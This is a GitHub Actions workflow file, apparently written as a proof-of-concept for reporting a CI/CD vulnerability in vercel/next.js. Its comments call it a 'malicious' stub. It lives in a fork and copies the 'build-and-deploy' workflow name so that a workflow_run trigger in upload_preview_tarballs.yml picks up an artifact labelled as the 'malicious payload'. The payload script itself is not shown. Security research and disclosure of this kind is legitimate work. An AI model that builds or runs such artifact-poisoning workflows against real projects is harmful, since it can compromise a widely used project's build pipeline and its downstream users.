# PoC stub: minimal build-and-deploy that produces only the malicious
# preview-tarballs artifact, so the workflow_run trigger of
# upload_preview_tarballs.yml fires within 5 minutes instead of 90.
# Workflow name kept as 'build-and-deploy' to match the trigger
# `workflow_run.workflows: ['build-and-deploy']` in upload_preview_tarballs.yml.
# This file lives only in the fork; vercel/next.js is untouched.
name: build-and-deploy

on:
  push:
    branches-ignore:
      - 'graphite-base/**'
  pull_request:
    types: [opened, synchronize]
  workflow_dispatch:

jobs:
  deploy-tarball:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Create tarballs (PoC malicious payload)
        run: node scripts/create-preview-tarballs.js "${{ github.event.after || github.sha }}" "${{ runner.temp }}/preview-tarballs"
      - name: Upload tarballs
        uses: actions/upload-artifact@v4
        with:
          name: preview-tarballs
          path: ${{ runner.temp }}/preview-tarballs/*
          retention-days: 1
